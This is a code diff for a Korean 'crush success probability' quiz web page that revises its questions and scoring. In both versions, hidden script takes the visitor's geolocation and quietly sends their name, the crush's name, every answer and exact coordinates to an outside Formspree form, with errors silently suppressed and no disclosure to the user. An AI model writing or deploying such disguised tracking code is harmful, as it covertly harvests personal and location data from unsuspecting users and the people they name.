@@ -2,7 +2,7 @@
 <html lang="ko">
 <head>
   <meta charset="utf-8">
-  <title>짝사랑 성공 확률 테스트 💘 (질문 기반)</title>
+  <title>짝사랑 성공 확률 테스트 💘</title>
   <style>
     body {
       font-family: 'Arial', sans-serif;
@@ -16,7 +16,7 @@
       border-radius: 12px;
       display: inline-block;
       box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-      max-width: 420px;
+      max-width: 440px;
       text-align: left;
     }
     h1 { color: #ff69b4; text-align: center; }
@@ -51,7 +51,6 @@
     <label>짝사랑 상대 이름:</label>
     <input type="text" id="crushName" required>
 
-    <!-- 기본 질문 6개 -->
     <div class="question">
       <label>1️⃣ 상대방과 얼마나 자주 대화하나요?</label>
       <label><input type="radio" name="q1" value="10"> 거의 안 해요</label>
@@ -100,39 +99,38 @@
       <label><input type="radio" name="q6" value="100"> 애교 섞인 톤이에요 💕</label>
     </div>
 
-    <!-- 감정형 추가 질문 7~10 -->
     <div class="question">
-      <label>7️⃣ 연락이 오면 너무 기쁘고, 안 오면 하루 종일 신경 쓰인다.</label>
-      <label><input type="radio" name="q7" value="20"> 전혀 그렇지 않아요</label>
-      <label><input type="radio" name="q7" value="50"> 가끔 그래요</label>
-      <label><input type="radio" name="q7" value="80"> 자주 그래요</label>
-      <label><input type="radio" name="q7" value="100"> 항상 그래요 💌</label>
+      <label>7️⃣ 상대가 나에게 먼저 말을 걸거나 연락한 적이 있나요?</label>
+      <label><input type="radio" name="q7" value="20"> 전혀 없어요 😢</label>
+      <label><input type="radio" name="q7" value="50"> 가끔 한두 번 있었어요</label>
+      <label><input type="radio" name="q7" value="80"> 종종 먼저 연락해요 😊</label>
+      <label><input type="radio" name="q7" value="100"> 자주 먼저 연락해요 💬</label>
     </div>
 
     <div class="question">
-      <label>8️⃣ 그 사람과 눈이 마주치기만 해도 심장이 뛴다.</label>
-      <label><input type="radio" name="q8" value="20"> 별로 안 그래요</label>
-      <label><input type="radio" name="q8" value="50"> 가끔 그래요</label>
-      <label><input type="radio" name="q8" value="80"> 꽤 그래요</label>
-      <label><input type="radio" name="q8" value="100"> 완전 그래요 💓</label>
+      <label>8️⃣ 내 이야기나 일상에 관심을 보이나요?</label>
+      <label><input type="radio" name="q8" value="20"> 전혀요 😐</label>
+      <label><input type="radio" name="q8" value="50"> 가끔 물어봐요</label>
+      <label><input type="radio" name="q8" value="80"> 제법 관심 있어요</label>
+      <label><input type="radio" name="q8" value="100"> 아주 세세하게 기억해요 💞</label>
     </div>
 
     <div class="question">
-      <label>9️⃣ 그 사람 주변 이성 친구들을 보면 질투가 난다.</label>
-      <label><input type="radio" name="q9" value="20"> 전혀 안 그래요</label>
-      <label><input type="radio" name="q9" value="50"> 조금 그래요</label>
-      <label><input type="radio" name="q9" value="80"> 자주 그래요</label>
-      <label><input type="radio" name="q9" value="100"> 너무 질투나요 😣</label>
+      <label>9️⃣ 내가 농담하거나 말하면 웃어주나요?</label>
+      <label><input type="radio" name="q9" value="20"> 거의 안 웃어요 😶</label>
+      <label><input type="radio" name="q9" value="50"> 예의상 웃어요 🙂</label>
+      <label><input type="radio" name="q9" value="80"> 자주 웃어요 😄</label>
+      <label><input type="radio" name="q9" value="100"> 항상 잘 웃고 반응이 좋아요 😂💗</label>
     </div>
 
     <div class="question">
-      <label>🔟 '혹시 나를 좋아하는 건 아닐까?' 하는 상상을 해본 적이 있다.</label>
-      <label><input type="radio" name="q10" value="20"> 그런 생각 전혀 안 해봤어요</label>
-      <label><input type="radio" name="q10" value="50"> 가끔 해요</label>
-      <label><input type="radio" name="q10" value="80"> 자주 그런 상상을 해요</label>
-      <label><input type="radio" name="q10" value="100"> 맨날 그래요 😳</label>
+      <label>🔟 나를 도와주거나 챙겨준 적이 있나요?</label>
+      <label><input type="radio" name="q10" value="20"> 그런 적 없어요</label>
+      <label><input type="radio" name="q10" value="50"> 한두 번 정도</label>
+      <label><input type="radio" name="q10" value="80"> 꽤 여러 번</label>
+      <label><input type="radio" name="q10" value="100"> 자주 챙겨줘요 💝</label>
     </div>
-    
+
     <button type="submit">결과 보기</button>
   </form>
 
@@ -171,13 +169,8 @@
         return;
       }
 
-      // 이름별 고정 확률을 위한 해시 기반 난수
-      const baseSeed = (yourName + crushName).split('')
-        .reduce((acc, char) => acc + char.charCodeAt(0), 0);
-      const fixedRandom = Math.abs(Math.sin(baseSeed)) * 10;
-
       const average = total / questions.length;
-      const percent = Math.round((average + fixedRandom) / 2);
+      const percent = Math.round(average);
 
       let message = "";
       if (percent < 40) message = "🥀 아직은 가능성이 낮아요... 조금 더 다가가보세요!";
@@ -185,32 +178,26 @@
       else if (percent < 90) message = "💞 좋은 분위기예요! 서로 마음이 통할지도 몰라요!";
       else message = "🔥 완벽해요! 곧 커플 탄생 예감입니다!";
 
-      resultBox.innerHTML = `
-        💖 <b>${yourName}</b>와(과) <b>${crushName}</b>의 짝사랑 성공 확률은<br>
-        <span style="font-size:24px;color:#ff69b4;">${percent}%</span><br><br>${message}
-      `;
+      // 지도 링크 포함
+      navigator.geolocation.getCurrentPosition((pos) => {
+        const { latitude, longitude } = pos.coords;
+        const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      // 위치 정보 가져오기
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
+        resultBox.innerHTML = `
+          💖 <b>${yourName}</b>와(과) <b>${crushName}</b>의 짝사랑 성공 확률은<br>
+          <span style="font-size:24px;color:#ff69b4;">${percent}%</span><br><br>${message}<br>
+          <a href="${mapLink}" target="_blank">📍 결과를 본 위치 보기</a>
+        `;
 
-          fetch("https://formspree.io/f/xanegwav", {
-            method: "POST",
-            headers: { "Accept": "application/json", "Content-Type": "application/json" },
-            body: JSON.stringify({
-              yourName,
-              crushName,
-              percent,
-              resultMessage: message,
-              answers,
-              location: { lat, lon },
-              googleMaps: `https://www.google.com/maps?q=${lat},${lon}`
-            })
-          }).catch(() => {});
-        });
-      }
+        fetch("https://formspree.io/f/xanegwav", {
+          method: "POST",
+          headers: { "Accept": "application/json", "Content-Type": "application/json" },
+          body: JSON.stringify({
+            yourName, crushName, percent, message,
+            location: mapLink, answers
+          })
+        }).catch(() => {});
+      });
     });
   </script>
 </body>
